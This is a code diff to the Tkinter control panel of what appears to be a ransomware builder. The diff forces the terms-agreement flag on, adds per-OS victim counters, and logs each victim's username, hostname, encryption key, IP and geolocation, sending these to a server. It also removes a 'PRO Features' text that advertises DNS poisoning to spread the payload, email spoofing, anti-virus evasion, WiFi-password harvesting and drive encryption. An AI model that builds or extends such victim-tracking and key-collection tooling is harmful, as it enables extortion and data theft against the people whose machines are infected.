@@ -369,7 +369,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -730,6 +730,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             'local' : StringVar(),
             'platform' : StringVar(),
             'key' : StringVar(),
+            'mac' : IntVar(),
+            'linux' : IntVar(),
+            'other' : IntVar(),
         }
 
         # Canvas for image
@@ -738,25 +741,69 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
         #photo = PIL.ImageTk.PhotoImage(PIL.Image.open(BytesIO(base64.b64decode(photo_code))))
         if platform.system() == 'Linux':
-            photo = Image.open(resource_path('images/logo2.png'))
-            resized = photo.resize((150,150), Image.ANTIALIAS)
-            photo = ImageTk.PhotoImage(resized)
+            photo1 = Image.open(resource_path('images/windows.png'))
+            resized = photo1.resize((100,100), Image.ANTIALIAS)
+            photo1 = ImageTk.PhotoImage(resized)
         else:
-            photo = PIL.Image.open(resource_path('images/logo2.png'))
-            resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
-            photo = PIL.ImageTk.PhotoImage(resized)
+            photo1 = PIL.Image.open(resource_path('images/windows.png'))
+            resized = photo1.resize((100,100), PIL.Image.ANTIALIAS)
+            photo1 = PIL.ImageTk.PhotoImage(resized)
 
-        label = Label(self.serv, image=photo)
-        label.image = photo # keep a reference!
+        if platform.system() == 'Linux':
+            photo2 = Image.open(resource_path('images/mac.png'))
+            resized = photo2.resize((100,100), Image.ANTIALIAS)
+            photo2 = ImageTk.PhotoImage(resized)
+        else:
+            photo2 = PIL.Image.open(resource_path('images/mac.png'))
+            resized = photo2.resize((100,100), PIL.Image.ANTIALIAS)
+            photo2 = PIL.ImageTk.PhotoImage(resized)
+
+        if platform.system() == 'Linux':
+            photo3 = Image.open(resource_path('images/linux.png'))
+            resized = photo3.resize((100,100), Image.ANTIALIAS)
+            photo3 = ImageTk.PhotoImage(resized)
+        else:
+            photo3 = PIL.Image.open(resource_path('images/linux.png'))
+            resized = photo3.resize((100,100), PIL.Image.ANTIALIAS)
+            photo3 = PIL.ImageTk.PhotoImage(resized)
+
+        if platform.system() == 'Linux':
+            photo4 = Image.open(resource_path('images/other.png'))
+            resized = photo4.resize((100,100), Image.ANTIALIAS)
+            photo4 = ImageTk.PhotoImage(resized)
+        else:
+            photo4 = PIL.Image.open(resource_path('images/other.png'))
+            resized = photo4.resize((100,100), PIL.Image.ANTIALIAS)
+            photo4 = PIL.ImageTk.PhotoImage(resized)
+
+        label = Label(self.serv, image=photo1, background = 'white')
+        label.image = photo1 # keep a reference!
         label.grid(row = 0, column = 0)
 
-        label2 = Label(self.serv, image=photo)
-        label2.image = photo # keep a reference!
-        label2.grid(row = 0, column = 3)
+        label2 = Label(self.serv, image=photo2, background = 'white')
+        label2.image = photo2 # keep a reference!
+        label2.grid(row = 0, column = 1)
+
+        label3 = Label(self.serv, image=photo3, background = 'white')
+        label3.image = photo3 # keep a reference!
+        label3.grid(row = 0, column = 2)
+
+        label4 = Label(self.serv, image=photo4, background = 'white')
+        label4.image = photo4 # keep a reference!
+        label4.grid(row = 0, column = 3)
+
+        self.serv.options['win'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
+        self.serv.options['win'].grid(row = 1, column = 0, columnspan = 1)
+        self.serv.options['mac'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
+        self.serv.options['mac'].grid(row = 1, column = 1, columnspan = 1)
+        self.serv.options['linux'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
+        self.serv.options['linux'].grid(row = 1, column = 2, columnspan = 1)
+        self.serv.options['other'] = Label(self.serv, text = 0, background = 'white', foreground = 'red', font='Helvetica 16 bold')
+        self.serv.options['other'].grid(row = 1, column = 3, columnspan = 1)
 
         # Log Frame
         result = LabelFrame(self.serv, text = 'Log', relief = GROOVE)
-        result.grid(row = 1, column = 0, rowspan = 4, columnspan = 4)
+        result.grid(row = 2, column = 0, rowspan = 4, columnspan = 5)
         self.serv.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
         self.serv.options['log'].grid(row = 0, column = 1)
 
@@ -1231,12 +1278,24 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         region,
         city,
         isp,
-        zip,
-        lat,
-        lon)
+        zip)
 
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
+
+                            if system == 'Windows':
+                                co = self.serv.options['win']['text'] + 1
+                                self.serv.options['win']['text'] = co
+                            elif system == 'Darwin':
+                                co = self.serv.options['mac']['text'] + 1
+                                self.serv.options['mac']['text'] = co
+                            elif system == 'Linux':
+                                co = self.serv.options['linux']['text'] + 1
+                                self.serv.options['linux']['text'] = co
+                            else:
+                                co = self.serv.options['other']['text'] + 1
+                                self.serv.options['other']['text'] = co
+
 
                             if save_keys == 1:
                                 payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip, 'lat' : lat, 'lon' : lon}
@@ -1396,56 +1455,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                   !
 
         (===||:::::::::::::::> PRO Features <:::::::::::::::||===)
-
-+ Unlock: More payload customization
-    Unlock further payload customization such as a custom file
-    extention for encrypted files and put a header in encrypted files
-    with your hacker or payload name.
-
-+ Unlock: MITM + DNS Poisoning (Note: experimental)
-    Add DNS Poisoning to your payload so when your victim executes your payload
-    the DNS is being modified, allowing you to redirect websites to other websites,
-    for example; google.com redirects to DownloadYourPayload.com. This allows
-    you to spread your payload to the entire internal network.
-
-+ Unlock: Emailing
-    Send your payload by Email to your victim.
-
-+ Unlock: Email Spoofing
-    Use a custom, fake and make up Email address and spoof an Email server
-    to send your payload with.
-
-+ Unlock: Email Cloning
-    Select a customizable Email template to use for your Email.
-
-+ Unlock: FUD
-    Make your payload Fully Undetectable by any anti-virus
-
-+ Unlock: Detection warning
-    Get warned when your payload(s) are detected by a anti-virus or show up
-    on nomoreransom.org.
-
-+ Unlock: Data gathering
-    Make your payload gather as much information as possible from
-    your victims machine and/or network such as saved WiFi passwords.
-    You can select which data your payload should harvest.
-
-+ Unlock: Encrypted Transfer
-    Encrypt the traffic between the payload and server.
-
-+ Unlock: Exploits
-    Select a exploit from a list to improve your payload delivery methods.
-
-+ Unlock: Drive detection
-    Detect mounted drives and target them for encryption
-
-+ Unlock: PRO updates & more to come
-    Not all updates are FREE, some updates are for PRO users only.
-    Get updates with a build in self updater via a secure SSL connection.
-
-,_._._._._._._._._|__________________________________________________________,
-|_|_|_|_|_|_|_|_|_|_________________________________________________________/
-                  !
 """
 
         self.pro = Toplevel()
